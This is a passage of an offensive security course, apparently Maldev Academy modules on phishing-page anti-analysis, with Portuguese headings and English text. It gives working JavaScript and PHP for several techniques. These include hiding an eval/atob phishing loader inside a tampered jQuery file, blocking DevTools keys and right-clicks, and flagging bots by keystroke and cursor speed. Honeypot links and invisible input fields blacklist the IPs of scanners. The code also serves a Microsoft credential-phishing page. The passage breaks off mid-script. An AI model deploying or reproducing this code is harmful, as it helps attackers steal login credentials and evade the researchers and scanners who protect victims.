Embedding malicious scripts within popular JavaScript libraries is another obfuscation technique that can be used to hide malicious code. By injecting our code into widely used libraries, such as those hosted on well-known CDNs, the malicious code blends in with legitimate traffic, reducing the likelihood of detection. Some popular JavaScript libraries include:
jQuery.js

- jQuery.min.js

- jQuery UI

- D3.js

Additional libraries can be found on cdnjs.com.

### Example - Modifying jQuery.js
In this example, we download and modify `jquery.js` to create a function that runs our malicious code and then execute the function. The first step is to download jQuery.js. Next, create a function somewhere in the file and immediately execute it, as shown below.

```
function customFunc(){
    // Load phishing page
    document.write(eval(atob('...')));
}

// Invoke it
customFunc();

```
For further obfuscation, minify the jQuery file via an online service such as Minify-JS and rename it to `jquery.min.js`. Finally, include the external script using the `<script>` tag.

```
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Maldev jQuery</title>
</head>
<body>

<script src="jquery.min.js"></script>
</body>
</html>

```

- Viewing page source only displays a simple HTML page that is using `jquery.min.js`.

- The `jquery.min.js` appears legitimate at first glance.

- Scrolling down further, we see our custom function with embedded Base64.

## Objetivos
Store the encrypted phishing page within a CSS file, making sure it contains no script tags

Implement recursive fetching of 50-100 files to introduce a brief delay in the loading of the phishing page

Perform string obfuscation on suspicious keywords such as document.write, eval and atob

Divide the encrypted phishing content into several files, camouflage each one with legitimate content and then fetch them and render the phishing page


---

# Módulo 49 — Anti-Análise Via Interação do Usuário

Módulo 49 — Anti-Analysis Via User Interaction

- # Módulo 49 — Anti-Análise Via Interação do Usuário

# Disclaimer

## Introdução
The next anti-analysis technique we will discuss is analyzing user behavior on the website. When phishing we are expecting the user to perform a certain action such as entering their credentials or downloading a file. Using the expected action as a baseline, we can monitor them for unexpected behavior that amounts to analysis or automation. An example is monitoring for anyone attempting to open the browser's Developer Tools via the shortcut command `Ctrl + Shift + I` (Windows) or `Command + Option + I` (MacOS). Legitimate users carrying out the expected action on our phishing page should not be accessing the Developer Tools. Therefore, if the shortcut is detected, we can assume it may be an attempt at analysis, allowing us to take action to prevent this.
## Whitelist de Caracteres
One strategy is to whitelist specific characters, which may work in cases where we know what the expected character set will be. The script below whitelists an array of characters, if any non-whitelisted key is pressed, it will print the event to the console. Notice that the script is attached to the `document` via `document.addEventListener`, meaning it will run whenever keys are pressed anywhere on the page. This can instead be attached to one or more input fields (e.g. username and password fields).
```
document.addEventListener('keydown', function(event) {
    const whitelistedChars = [
        'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
        'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
        'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
        'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
        '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
        '.', '-', `!`, `@`, '#', `$`, `%`, `^`, `&`, `*`, `(`, `)`, `_`,
        'CapsLock', 'Space', 'Enter', 'Escape', 'Backspace',
        'ArrowLeft', 'ArrowUp', 'ArrowRight', 'ArrowDown'
    ];

    if (!whitelistedChars.includes(event.key)) {
        console.log('Blacklisted key press detected: ' + event.key);
        // Take action against the bot/analyst here
    }
});

```
Whitelisting characters may negatively impact the user experience if they try to press a key that's blacklisted, such as `Ctrl`, for legitimate purposes (e.g. `Ctrl + V`). A better alternative in this case is to blacklist characters and specific character sequences.
### Blacklisting Keys And Combinations
When our website is under manual inspection, an analyst might use specific keys or key combinations to further inspect the website. For example, in the unfortunate circumstance where John Hammond happens to be analyzing our phishing website, he may press `F12` to open the Developer Tools.To counteract this, we will block certain keys and key combinations commonly used during analysis, including:
`F12`

- `Ctrl + Shift`

- `Ctrl + Alt`

- `Ctrl + S`

- `Ctrl + U`

- `Meta + Alt` (MacOS)

- `Meta + Shift` (MacOS)

- `Meta + S` (MacOS)

- `Meta + U` (MacOS)

We can also use `event.preventDefault()` to prevent the event from taking place. For example, if a user clicks `Ctrl + S`, the `preventDefault()` will prevent the save dialog from appearing.

```
document.addEventListener('keydown', function(event) {
    // Detect F12
    if (event.key === 'F12') {
        console.log('Suspicious key detected: F12');
        event.preventDefault();
    }

    // Detect Ctrl + Shift
    if (event.ctrlKey && event.shiftKey) {
        console.log('Suspicious key detected: Ctrl + Shift');
        event.preventDefault();
    }

    //  Detect Ctrl + Alt
    if (event.ctrlKey && event.altKey) {
        console.log('Suspicious key detected: Ctrl + Alt');
        event.preventDefault();
    }

    // Detect Ctrl + S
    if (event.ctrlKey && event.key.toLowerCase() === 's') {
        console.log('Suspicious key detected: Ctrl + S');
        event.preventDefault();
    }

    // Detect Ctrl + U
    if (event.ctrlKey && event.key.toLowerCase() === 'u') {
        console.log('Suspicious key detected: Ctrl + U');
        event.preventDefault();
    }

    // Detect Meta + Alt (MacOS)
    if (event.metaKey && event.altKey) {
        console.log('Suspicious key detected: Meta + Alt');
        event.preventDefault();
    }

    // Detect Meta + Shift (MacOS)
    if (event.metaKey && event.shiftKey) {
        console.log('Suspicious key detected: Meta + Shift');
        event.preventDefault();
    }

        // Detect Meta + S (MacOS)
    if (event.metaKey && event.key.toLowerCase() === 's') {
        console.log('Suspicious key detected: Meta + S');
        event.preventDefault();
    }

    // Detect Meta + U (MacOS)
    if (event.metaKey && event.key.toLowerCase() === 'u') {
        console.log('Suspicious key detected: Meta + U');
        event.preventDefault();
    }
});

```
The video can be found in folder: `./videos/blacklist-combo.mov`

### Keystroke Speed Analysis
Analyzing the speed of the keys being pressed can also indicate if our website is being analyzed by an automated scanner. The JavaScript below will calculate the speed, in milliseconds, between each keystroke. Note that the first keystroke's time indicates how long after the page loaded it took for a key to be pressed.

```
let lastKeyPressTime = Date.now();

document.addEventListener('keydown', function(event) {
    const currentTime = Date.now();
    const timeDifference = currentTime - lastKeyPressTime; // Difference between last keystroke and this keystroke
    lastKeyPressTime = currentTime; // Update lastKeyPressTime to the current time

    console.log(`Time since last key press: ${timeDifference} ms. Key: ${event.key}`);
});

```
After adding the script above to our phishing website, we'll refresh the page and enter "MALDEV123".

The results indicate that the speeds varied between 42 to 1056 milliseconds, excluding the first character.

Let's compare the human keystroke speed with an automated keystroke speed. The image below shows the same string being entered via a browser automation tool.

Notice that the automated keystroke speed is significantly faster than a human's keystroke speed. A simple method that some automated programs might use to delay keystroke entry is to introduce a fixed delay.

#### Detecting Abnormal Keystroke Speeds
To detect the abnormally fast input speeds associated with automated tools and scanners, we’ll attach an event listener to our password field. This listener can also be applied to the entire document or other input fields. If the average time between each keystroke is less than 50 milliseconds, we will assume the input is automated. Additionally, if there is a pause in typing for 500 milliseconds, we will consider the user to have finished typing. Note that this method may require baselining to avoid false positives.

```
const inputField = document.getElementById('password');
let lastKeyPressTime = Date.now();
let keyPressDifferences = [];
let typingTimeout;

inputField.addEventListener('keydown', function(event) {
    const currentTime = Date.now();
    const timeDifference = currentTime - lastKeyPressTime;
    lastKeyPressTime = currentTime;

    // Store time differences in the array
    keyPressDifferences.push(timeDifference);

    // Clear the previous timeout set via setTimeout
    clearTimeout(typingTimeout);

    typingTimeout = setTimeout(() => {
        if (keyPressDifferences.length > 1) { // Ensure there is more than the initial difference
            keyPressDifferences.shift(); // Remove the first element (this is usually higher than the rest)

            // Calculate average time difference
            const average = keyPressDifferences.reduce((a, b) => a + b, 0) / keyPressDifferences.length;
            console.log(`Average time between keystrokes: ${average} ms`);

            if (average < 50) {
                console.log('Bot behavior detected.');
            }
        }

        keyPressDifferences = [];
    }, 500); // We assume the user stopped typing if theres 500ms of no typing
});

```
The video can be found in folder: `./videos/bot-behavior-keystroke.mov`

## Right-Click Detection
Shifting our focus to user interaction through their mouse, the first measure we can implement is detecting right-clicks on our page. Right-clicks can allow a user to open the Developer Tools or view the page's source code and therefore can be considered analysis activity. Blocking right-clicks can be easily achieved by listening for the `contextmenu` event and blocking it via `preventDefault()`.

```
document.addEventListener('contextmenu', function(event) {
    event.preventDefault();
    console.log('Right-click detected and blocked.');
});

```
We can further enhance this by checking where the right-click occurs, if it's inside the input fields, we allow it, if not then we take action against the user.

```
document.addEventListener('contextmenu', function(event) {

    var inputField = document.getElementById('password');

    // Allow the right click if it happened inside the password field
    if (inputField.contains(event.target)) {
        console.log('Right click detected inside the input field');
    } else {
        // Block right clicks outside of the input field
        event.preventDefault();
        console.log('Right click detected outside the input field');
        // Take further action
    }
});

```
The video can be found in folder: `./videos/right-click-detection.mov`

## Cursor Speed
The next measure is analyzing cursor speed to determine whether the activity is human or automated. We'll use the JavaScript script below to log the amount of pixels moved per millisecond:

```
document.addEventListener('mousemove', (function() {
    let lastX = null;
    let lastY = null;
    let lastTime = null;

    return function(event) {
        const currentTime = Date.now();
        if (lastX !== null && lastY !== null && lastTime !== null) {
            const deltaX = event.clientX - lastX;
            const deltaY = event.clientY - lastY;
            const deltaT = currentTime - lastTime;
            const speed = Math.sqrt(deltaX * deltaX + deltaY * deltaY) / deltaT;

            console.log(`Cursor speed: ${speed.toFixed(2)} pixels per millisecond`);
        }
        
        lastX = event.clientX;
        lastY = event.clientY;
        lastTime = currentTime;
    };
})());

```
A human moving their mouse on the page shows the following results:

Whereas browser automation produces several "Infinity" and "NaN" results due to multiple movements occurring in the same millisecond.

With that in mind, we'll update the JavaScript function to detect bots if the speed is over 15px per millisecond or if "Infinity" or "NaN" speeds are detected.

```
document.addEventListener('mousemove', (function() {
    let lastX = null;
    let lastY = null;
    let lastTime = null;

    return function(event) {
        const currentTime = Date.now();
        if (lastX !== null && lastY !== null && lastTime !== null) {
            const deltaX = event.clientX - lastX;
            const deltaY = event.clientY - lastY;
            const deltaT = currentTime - lastTime;
            let speed = Math.sqrt(deltaX * deltaX + deltaY * deltaY) / deltaT;

            if (isNaN(speed) || !isFinite(speed)) {
                console.log('Bot detected: Impossible speed');
            } else {
                console.log(`Cursor speed: ${speed.toFixed(2)} pixels per millisecond`);
            }

            // Check for high speed indicating bot-like behavior
            if (speed > 15) {
                console.log('Bot detected: High speed');
            }
        }
        
        // Update the last positions and time for the next event
        lastX = event.clientX;
        lastY = event.clientY;
        lastTime = currentTime;
    };
})());

```
Running an automated browser again and viewing our console shows that impossible speed is being detected.

## Page Navigation Behaviour
We can implement additional tracking mechanisms that provide us information of whether the user is really trying to perform the requested action (e.g. logging in, downloading a file, etc.) or whether the user is straying away from the requested task and analyzing our page.

### Dummy Information Entry
It's common for users or analysts to enter dummy data into input fields and submit the form to analyze the website. We can assess the input and if the user is submitting dummy data, assume the user is analyzing the website. The primary disadvantage of this technique is determining what the dummy data would look like. For example, in cases where there's an email and password, we can assume that any email that does not end with the target company's domain (i.e. "@company.com") is dummy data.

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
        }

        #submit-form {
            background-color: #ffffff;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 360px;
        }

        div {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-size: 14px;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
            font-size: 16px;
        }

        input[type="email"]:focus,
        input[type="password"]:focus {
            border-color: #0056b3;
            outline: none;
        }

        button {
            width: 100%;
            padding: 10px 0;
            background-color: #007bff;
            border: none;
            border-radius: 5px;
            color: white;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s;
        }

        button:hover,
        button:focus {
            background-color: #0056b3;
            outline: none;
        }
    </style>
</head>
<body>
    <form id="submit-form">
        <div>
            <label for="email">Email:</label>
            <input type="email" id="email" name="email">
        </div>
        <div>
            <label for="password">Password:</label>
            <input type="password" id="password" name="password">
        </div>
        <button type="submit">Submit</button>
    </form>
</body>
<script>
const form = document.getElementById('submit-form');

form.addEventListener('submit', function(event) {
    const email = document.getElementById('email').value;
    
    // If email doesn't end with our target company, block the submission & log
    if (!email.endsWith('@company.com')) {
        console.log('Analysis attempt detected.');
        event.preventDefault();
    }
});
</script>
</html>

```

### User Inactivity
When a user navigates to our page, we expect them to perform the expected action within a set amount of time. If the user opens our phishing website and is idle for a set amount of time, we can detect this behavior. The script below will monitor for user inactivity and if the user is inactive for more than the `TIMEOUT_VALUE`, it will output "Inactivity detected".

```
document.addEventListener('DOMContentLoaded', function() {
    var activityTimer;
    const TIMEOUT_VALUE = 120000; // 120 seconds or 2 minutes

    // Reset the timer whenever user interacts with the page
    function resetTimer() {
        clearTimeout(activityTimer);
        activityTimer = setTimeout(() => {
            console.log('Inactivity detected');
        }, TIMEOUT_VALUE);
    }

    resetTimer();

    // Monitor for user activity
    document.addEventListener('mousemove', resetTimer);
    document.addEventListener('keydown', resetTimer);
    document.addEventListener('scroll', resetTimer);
});

```

## Action Upon Detection
In all the examples presented in this module so far, we have simply logged messages to the console when detecting automated or analysis behavior. However, in a real phishing scenario, the page should take action against the user rather than merely printing a message to the console.

There are several possible actions that can be taken. One approach is to redirect the user to a benign website using JavaScript, such as `window.location.replace("http://www.google.com");`. Another option is to wipe or replace the page's contents with an error message, for example, `document.write('An error occurred on the website.')`. These techniques help prevent automated scanners or analysts from interacting further with the phishing page.

### Example - Wipe Content & Blacklist IP
In this example, we'll analyze the user's keystroke speed, if it's above a certain threshold, the content will be replaced with an error message and the user's IP address will be added to our `ip_blacklist.txt` file, preventing them from viewing the page again.

First, we'll start by adding the previously demonstrated JavaScript that checks the average keystroke speed to our Microsoft phishing page. The JavaScript has been slightly modified so that if the average speed between each keystroke is less than 50ms, we send the encrypted IP address via an HTTP `GET` Request to `block.php` then overwrite the page via `document.write` to display a generic error message.

```
const inputField = document.getElementById('password');
let lastKeyPressTime = Date.now();
let keyPressDifferences = [];
let typingTimeout;

inputField.addEventListener('keydown', function(event) {
    const currentTime = Date.now();
    const timeDifference = currentTime - lastKeyPressTime;
    lastKeyPressTime = currentTime;

    keyPressDifferences.push(timeDifference);

    clearTimeout(typingTimeout);

    typingTimeout = setTimeout(() => {
        if (keyPressDifferences.length > 1) {
            keyPressDifferences.shift();

            const average = keyPressDifferences.reduce((a, b) => a + b, 0) / keyPressDifferences.length;
            console.log(`Average time between keystrokes: ${average} ms`);

    if (average < 50) {
        // The encrypted IP address
        var encIp = document.getElementById('encIp').value;

        // GET request
        var url = `http://example.com/block.php?encIp=${encodeURIComponent(encIp)}`;
        fetch(url);

        document.write(`
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <title>Error</title>
                <style>
                    body { 
                        font-family: Arial, sans-serif; 
                        display: flex; 
                        justify-content: center; 
                        align-items: center; 
                        height: 100vh; 
                        margin: 0; 
                        background-color: #f4f4f4; 
                        color: #333; 
                        text-align: center; 
                    }
                </style>
            </head>
            <body>
                <p>Error loading the page. Please try again later.</p>
            </body>
            </html>
        `);
    }
        }

        keyPressDifferences = [];
    }, 500);
});

```
The `index.php` script serves as the main entry point and performs several key actions. It checks whether the requester's IP address is listed in the `ip_blacklist.txt` file. If the IP is found, the script returns a generic error message and halts further execution.

If the IP address is not blacklisted, the script retrieves the contents of the Microsoft phishing page stored in `/var/www/ms-login.html`. It then encrypts the user's IP address using the `encryptIpAddress` function and embeds the encrypted value into a hidden input field with the ID `"encIp"`. The `encryptIpAddress` function encrypts is a custom function that has two parameters:

- `$ipAddress` - The IP address to be encrypted.

- `$key` - The encryption key.

The function returns the encrypted and Base64-encoded IP address.

Lastly, the script inserts this hidden input field into the phishing page using regex and the `preg_replace` function in PHP, ensuring the encrypted IP is included in the page before it is displayed to the user.

```
<?php
function encryptIpAddress($ipAddress, $key) {
    $method = 'AES-256-CBC';
    $ivLength = openssl_cipher_iv_length($method);
    $iv = openssl_random_pseudo_bytes($ivLength);

    $encrypted = openssl_encrypt($ipAddress, $method, $key, 0, $iv);
    $result = base64_encode($iv . $encrypted);
    return $result;
}

// Must be the same in the block.php file
$encryptionKey = 'MaldevSecretKey321';

// Get user's IP address
$userIp = $_SERVER['REMOTE_ADDR'];

// Check if the IP is in the ip_blacklist.txt file
$blacklist = file('/var/www/ip_blacklist.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

if (in_array($userIp, $blacklist)) {
    echo "<!DOCTYPE html>
          <html lang='en'>
          <head>
              <meta charset='UTF-8'>
              <title>Error</title>
              <style>
                  body { 
                      font-family: Arial, sans-serif; 
                      display: flex; 
                      justify-content: center; 
                      align-items: center; 
                      height: 100vh; 
                      margin: 0; 
                      background-color: #f4f4f4; 
                      color: #333; 
                      text-align: center; 
                  }
              </style>
          </head>
          <body>
              <p>Error loading the page. Please try again later.</p>
          </body>
          </html>";
    exit;
}

// Encrypt the IP address
$encryptedIp = encryptIpAddress($userIp, $encryptionKey);

// Fetch the phishing page's contents
$htmlContent = file_get_contents('/var/www/ms-login.html');

// Prepare the encrypted IP input field HTML
$encryptedIpInput = "<input type='hidden' id='encIp' name='encIp' value='" . htmlspecialchars($encryptedIp) . "'>";

// Add the encrypted IP address before the submit button
$pattern = '/(<input type="submit"[^>]*>)/i';
$replacement = $encryptedIpInput . '$1';
$updatedPhishingPage = preg_replace($pattern, $replacement, $htmlContent);

echo $updatedPhishingPage;
?>

```
The last piece to our example is `block.php`, which receives the encrypted IP address via the `GET` parameter `encIP`, decrypts it using `decryptIpAddress`, and appends it to the `ip_blacklist.txt` file.

The `decryptIpAddress` decrypts an encrypted IP address, given the encrypted IP and encryption key.

```
<?php
function decryptIpAddress($encryptedData, $key) {
    $method = 'AES-256-CBC';
    $ivLength = openssl_cipher_iv_length($method);
    $data = base64_decode($encryptedData);
    $iv = substr($data, 0, $ivLength);
    $encrypted = substr($data, $ivLength);
    $decrypted = openssl_decrypt($encrypted, $method, $key, 0, $iv);

    return $decrypted;
}

// The same key from our index.php file
$encryptionKey = 'MaldevSecretKey321';

// Get the encrypted IP from the URL parameter
$encryptedIp = isset($_GET['encIp']) ? $_GET['encIp'] : '';

if (!empty($encryptedIp)) {

    $decryptedIp = decryptIpAddress($encryptedIp, $encryptionKey);

    // Append the decrypted IP to the blacklist file
    $file = '/var/www/ip_blacklist.txt';

    // Check if the IP is already in the file to avoid duplicates
    $currentContents = file_get_contents($file);
    if ($currentContents !== false && strpos($currentContents, $decryptedIp) === false) {
        file_put_contents($file, $decryptedIp . "\n", FILE_APPEND);
        http_response_code(200);
    } else {
        http_response_code(400); 
    }
} else {
    http_response_code(400);
}
?>

```
The video can be found in folder: `./videos/final-demo.mov`

## Objetivos
Monitor for mouse movements on the ms-login.html phishing page. If the cursor movement is abnormally fast, add a cookie to the user that blocks them from accessing the website

Monitor for blacklisted keys being pressed. If a blacklisted key is pressed, blacklist the user's IP address and wipe the page


---

# Módulo 50 — Anti-Análise Via Honeypots

Módulo 50 — Anti-Analysis Via Honeypots

- # Módulo 50 — Anti-Análise Via Honeypots

# Disclaimer

## Introdução
Similar to how defenders use honeypots and canaries to detect malicious activity, attackers can utilize the same technology to detect analysis being performed on the website. In this module, we'll explore several strategies to detect automated and manual analysis of our phishing website.
## Links Ocultos
The first method involves creating a hidden link that a legitimate user visiting the website would never interact with. Automated scanners parse HTML elements, searching for embedded links to access and analyze the website's behavior. Additionally, analysts may manually inspect the website and discover these hidden links to evaluate their purpose.To implement this, a link will be added using the `<a>` tag, but with the CSS property `display: none;`, ensuring the element is not visible on the website to users.
```
<a href="/conduct.php" class="custom">Code of Conduct</a>

```

```
.custom {
    display: none;
}

```
Anyone who accesses `conduct.php` will have their IP added to the `ip_blacklist.txt` file and then it will return an HTTP 404 - Not Found.
```
<?php
$blacklistFile = '/var/www/ip_blacklist.txt';

$clientIp = $_SERVER['REMOTE_ADDR'];

$blacklistedIps = file($blacklistFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

if (!in_array($clientIp, $blacklistedIps)) {
    file_put_contents($blacklistFile, $clientIp . PHP_EOL, FILE_APPEND | LOCK_EX);
}

// HTTP 404 response
header("HTTP/1.1 404 Not Found");
exit();
?>

```
The URL is submitted to various scanning services, such as Sucuri Site Check, which crawls the `conduct.php` page and results in the scanner's IP address being added to the blacklist.
### Links In Comments
A link can also be added in the comments section of the HTML code. Since comments are invisible to users, only automated or manual analysis of the website would reveal the link. Accessing this hidden link would indicate that the website is being analyzed.
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Page</title>
    <style>
        .custom {
            display: none;
        }
    </style>
</head>
<body>
    <!-- http://example.com/backup/file.php -->
    <!-- /access.php -->
    <p>Welcome to the website. There's hidden elements.</p>
</body>
<script>
// http://example.com/log.php
</script>
</html>

```
In this case both `/backup/file.php` and `access.php` would blacklist the IP address upon access and return a HTTP 404.
## Header HTTP Obrigatório
When a user submits a form or downloads a file, we can include a custom HTTP header in the request using the JavaScript Fetch API. This custom header acts as an identifier that would only be present if the action is performed through the website's interface. If we detect that the request is missing this header, it likely indicates that the action was performed as part of automated or manual analysis, rather than by a legitimate user interacting with the site as intended.
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
        }

        #submit-form {
            background-color: #ffffff;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 360px;
        }

        div {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-size: 14px;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
            font-size: 16px;
        }

        input[type="email"]:focus,
        input[type="password"]:focus {
            border-color: #0056b3;
            outline: none;
        }

        button {
            width: 100%;
            padding: 10px 0;
            background-color: #007bff;
            border: none;
            border-radius: 5px;
            color: white;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s;
        }

        button:hover,
        button:focus {
            background-color: #0056b3;
            outline: none;
        }
    </style>
</head>
<body>
    <form id="submit-form">
        <div>
            <label for="email">Email:</label>
            <input type="email" id="email" name="email">
        </div>
        <div>
            <label for="password">Password:</label>
            <input type="password" id="password" name="password">
        </div>
        <button type="submit">Submit</button>
    </form>
</body>
<script>
document.getElementById('submit-form').addEventListener('submit', function(event) {
    event.preventDefault();

    const formData = new FormData(this);
    fetch('login.php', {
        method: 'POST',
        body: formData,
        headers: {
            'X-Custom-Header': 'Maldev Academy'
        }
    }).then(response => response.text()).then(data => {
        // Do something based on the response
    });
});
</script>
</html>

```
The `login.php` file searches for the existence of the header and places the IP address in the blacklist file if it's missing.
```
<?php
$blacklistFile = '/var/www/ip_blacklist.txt';

$clientIp = $_SERVER['REMOTE_ADDR'];

if (isset($_SERVER['HTTP_X_CUSTOM_HEADER']) && $_SERVER['HTTP_X_CUSTOM_HEADER'] === 'Maldev Academy') {
    header("HTTP/1.1 200 OK");
    return;
}

$blacklistedIps = file($blacklistFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

if (!in_array($clientIp, $blacklistedIps)) {
    file_put_contents($blacklistFile, $clientIp . PHP_EOL, FILE_APPEND | LOCK_EX);
}

header("HTTP/1.1 404 Not Found");
return;
?>

```

## Hidden Input Field
The final technique involves placing a hidden input field within the form that legitimate users should never interact with. A bot or scanner will see the field, however a legitimate user will be unlikely to notice it. Therefore, if any interaction with this field is detected, the client will be redirected away from the phishing page, and the associated IP address will be blacklisted.A straightforward approach to create a hidden input is by using an `<input>` element with `type="hidden"`. However, we'll explore a more creative technique by concealing the input field with CSS. In this method, the `<input>` element will be assigned the `type="text"` attribute, making it appear as a standard text input field. Additionally, we'll set `tabindex="-1"` to prevent the field from being selected when navigating with the `TAB` key. Finally, we'll apply CSS styling to remove borders, change the background and text color to white (matching the white background), and reduce the height to 5 pixels.
```
<style>
#confirm {
    background-color: white;
    border: none;
    height: 5px;
    color: white;
    cursor: default;
}

#confirm:focus {
    outline: none;
}

/* Don't change the cursor on hover */
#confirm:hover {
    cursor: default;
}
</style>

<input type="text" id="confirm" name="confirm" tabindex="-1">

<!-- Other elements -->
<!-- Other elements -->
<!-- Other elements -->

```
The image below shows the hidden input field blending in with the background, making it invisible for a user interacting with the website's interface.In the following section, this input field is integrated with the login page and we'll create JavaScript and PHP scripts that handle redirecting and blocking the IP address.
### Complete Code
Start by creating `index.php`, a PHP script that returns the contents of `login.html` with the encrypted IP address. This script will also check if the user's IP address is in the `ip_blacklist.txt` file and return an error page instead of providing the contents of `login.html`.
```
<?php
function encryptIpAddress($ipAddress, $key) {
    $method = 'AES-256-CBC';
    $ivLength = openssl_cipher_iv_length($method);
    $iv = openssl_random_pseudo_bytes($ivLength);

    $encrypted = openssl_encrypt($ipAddress, $method, $key, 0, $iv);
    $result = base64_encode($iv . $encrypted);
    return $result;
}

$encryptionKey = 'MaldevSecretKey321'; // Key must be the same in block.php to decrypt successfully

$userIp = $_SERVER['REMOTE_ADDR'];

$blacklist = file('/var/www/ip_blacklist.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
if (in_array($userIp, $blacklist)) {
    echo "<!DOCTYPE html>
          <html lang='en'>
          <head>
              <meta charset='UTF-8'>
              <title>Error</title>
              <style>
                  body { 
                      font-family: Arial, sans-serif; 
                      display: flex; 
                      justify-content: center; 
                      align-items: center; 
                      height: 100vh; 
                      margin: 0; 
                      background-color: #f4f4f4; 
                      color: #333; 
                      text-align: center; 
                  }
              </style>
          </head>
          <body>
              <p>Error loading the page. Please try again later.</p>
          </body>
          </html>";
    exit;
}

$encryptedIp = encryptIpAddress($userIp, $encryptionKey);

$htmlContent = file_get_contents('/var/www/login.html'); // login.html must exist in /var/www/
$updatedHtmlContent = str_replace('IPADDRESS', htmlspecialchars($encryptedIp), $htmlContent); // Find and replace the string 'IPADDRESS' with the encrypted IP
echo $updatedHtmlContent;

?>

```
Notice the line below that searches for the string 'IPADDRESS' and replaces it with the encrypted IP address. This is an easier approach than what was done before where we had to use complex regex to include the encrypted IP address.
```
$updatedHtmlContent = str_replace('IPADDRESS', htmlspecialchars($encryptedIp), $htmlContent);

```
Next, create `login.html` and place it in the `/var/www/` directory to be read by the previous PHP script. The `login.html` is the same login page we used in this module with a few changes as it now includes:
The hidden input field and its styling.

- Another input field with ID `encIp` that has the user's encrypted IP address. The value by default is set to "IPADDRESS" which will be replaced with the encrypted IP address.

- The `<script>` that detects input on the field and sends a GET request to `block.php` with the `encIp`'s value, which is the user's encrypted IP address. After that, it redirects the user to `www.google.com`.

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
        }

        #submit-form {
            background-color: #ffffff;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 360px;
        }

        div {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-size: 14px;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
            font-size: 16px;
        }

        input[type="email"]:focus,
        input[type="password"]:focus {
            border-color: #0056b3;
            outline: none;
        }

        button {
            width: 100%;
            padding: 10px 0;
            background-color: #007bff;
            border: none;
            border-radius: 5px;
            color: white;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s;
        }

        button:hover,
        button:focus {
            background-color: #0056b3;
            outline: none;
        }

        #confirm {
            background-color: white;
            border: none;
            height: 5px;
            color: white;
        }

        #confirm:focus {
            outline: none;
        }

        #confirm:hover {
            cursor: default;
        }

    </style>
</head>
<body>
    <form id="submit-form">
        <div>
            <label for="email">Email:</label>
            <input type="email" id="email" name="email">
        </div>
        <div>
            <label for="password">Password:</label>
            <input type="password" id="password" name="password">

            <!-- Honeypot input field -->
            <input type="text" id="confirm" name="confirm" tabindex="-1">
        </div>
        <button type="submit">Submit</button>
    </form>
    <!-- Encrypted IP address will be placed in the 'value' -->
    <input type="hidden" name="encIp" id="encIp" value="IPADDRESS">
</body>
<!-- The script that waits for input in the 'confirm' input field -->
<script type="text/javascript">
    const inputField = document.getElementById('confirm');
    const encIp = document.getElementById('encIp');

    inputField.addEventListener('input', function(event) {
        var url = `http://example.com/block.php?encIp=${encodeURIComponent(encIp.value)}`; // Don't forget to change example.com
        fetch(url)
        .then(response => response.text()) // You have to wait for the response before redirecting.
        .then(data => {
            window.location.href = 'https://www.google.com';
        });
    });
</script>
</html>

```
The last component is the `block.php` file which receives the encrypted IP address, decrypts it, and adds the IP address to `ip_blacklist.txt`. This file is the same as the one shown in the Anti-Analysis: User-Interaction module.

```
<?php
function decryptIpAddress($encryptedData, $key) {
    $method = 'AES-256-CBC';
    $ivLength = openssl_cipher_iv_length($method);
    $data = base64_decode($encryptedData);
    $iv = substr($data, 0, $ivLength);
    $encrypted = substr($data, $ivLength);
    $decrypted = openssl_decrypt($encrypted, $method, $key, 0, $iv);

    return $decrypted;
}

// The same key from our index.php file
